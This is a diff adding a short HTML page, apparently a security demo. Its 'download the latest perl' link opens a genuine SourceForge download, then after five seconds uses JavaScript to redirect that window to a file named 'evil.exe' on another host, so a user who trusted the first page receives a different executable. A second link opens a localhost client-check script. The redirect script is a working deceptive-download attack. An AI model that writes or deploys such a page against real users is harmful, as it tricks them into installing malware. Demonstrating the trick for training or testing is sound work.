@@ -1,0 +1,21 @@
+<html>
+  <head>
+  </head>
+  <body>
+    <a  href="http://sourceforge.net/projects/websecuritydojo/files/latest/download?source=directory" 
+        id="thelink">download the latest perl </a>
+		<a href="#" onclick="window.open('http://localhost/xhawasli/clientCheck.php')">me</a>
+    <script>
+			var el = document.getElementById("thelink");
+			el.addEventListener("click", function(e){
+				e.preventDefault();
+        var a = window.open("http://sourceforge.net/projects/websecuritydojo/files/latest/download?source=directory");
+        setTimeout(function(){
+          a.location.replace("http://michaelhendrickx.com/misc/evil.exe");
+        }, 5000)
+				return false;
+			});
+    </script>
+  </body>
+</html>
+
